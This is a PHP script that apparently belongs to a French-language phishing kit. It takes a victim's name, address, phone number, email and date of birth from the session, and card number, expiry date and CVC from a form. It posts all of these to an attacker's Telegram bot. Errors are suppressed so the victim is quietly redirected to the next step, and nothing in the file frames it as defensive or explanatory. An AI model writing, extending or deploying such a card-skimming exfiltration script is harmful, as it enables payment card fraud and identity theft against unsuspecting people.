
<?php
session_start(); 

$config = require '../config.php';

$rezbotToken = $config['rezbotToken']; 
$rezchatId = $config['rezchatId']; 

function clean($data) {
    return htmlspecialchars(stripslashes(trim($data)));
}

$type     = $_SESSION['type'] ?? '';
$nom      = $_SESSION['nom'] ?? '';
$adresse  = $_SESSION['adresse'] ?? '';
$zip      = $_SESSION['zip'] ?? '';
$email    = $_SESSION['email'] ?? '';
$ville    = $_SESSION['ville'] ?? '';
$dob      = $_SESSION['dob'] ?? '';
$tel      = $_SESSION['tel'] ?? '';

$titu     = clean($_POST['titu'] ?? '');
$ccc      = clean($_POST['ccc'] ?? '');
$exp      = clean($_POST['exp'] ?? '');
$cvc      = clean($_POST['cvc'] ?? '');

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Inconnue';
$os = $_SERVER['HTTP_USER_AGENT'] ?? 'Inconnu';

$bin = substr(preg_replace('/\s+/', '', $ccc), 0, 6); 
$scan_url = "cardimages.imaginecurve.com/cards/{$bin}.png";  

$message = <<<TEXT
<b>💳 + 1 CARTE</b>

<b>🏦 Informations Personnelles</b>
├ 🕵️ Nom complet : <code>$nom</code>
├ 🏠 Adresse : <code>$adresse</code>
├ 📮 Zip : <code>$zip</code>
├ 📞 Numéro de téléphone : <code>$tel</code>
└ 📧 Email : <code>$email</code>
└ 🎂 Date de naissance : <code>$dob</code>

<b>🏦 Carte de Paiement</b>
├ 🍒 Titulaire : <code>$titu</code>
├ 💳 Numéro de carte : <code>$ccc</code>
├ 📅 Expiration : <code>$exp</code>
└ 🔒 Cryptogramme visuel : <code>$cvc</code>

<b>🗃 Coordonnées Bancaires</b>
├ 🎯 Bin : #<code>$bin</code>
├ 🏷️ Nom de la banque : error
├ 🏷️ Type : error
└ 🏷️ Niveau : error

<b>🧩 Extra</b>
├ 🏷️ Bin : #<code>$bin</code>
├ 🌐 IP : <code>$ip</code>
├ 🖼️ SCAN : $scan_url
└ 🖥️ OS : <code>$os</code>
TEXT;

// Try to send Telegram notification, but don't fail if it doesn't work
try {
    $url = "https://api.telegram.org/bot$rezbotToken/sendMessage";
    $data = [
        'chat_id' => $rezchatId,
        'text' => $message,
        'parse_mode' => 'HTML' 
    ];
    
    // Use cURL instead of file_get_contents for better error handling
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 5 second timeout
        $result = curl_exec($ch);
        curl_close($ch);
    } else {
        // Fallback to file_get_contents with error suppression
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
                'timeout' => 5
            ]
        ];
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
    }
} catch (Exception $e) {
    // Silently fail - we don't want to stop the user flow
    $result = false;
}

// Always redirect to next step, regardless of Telegram API result
header('Location: ../step/t.php');
exit;
?>
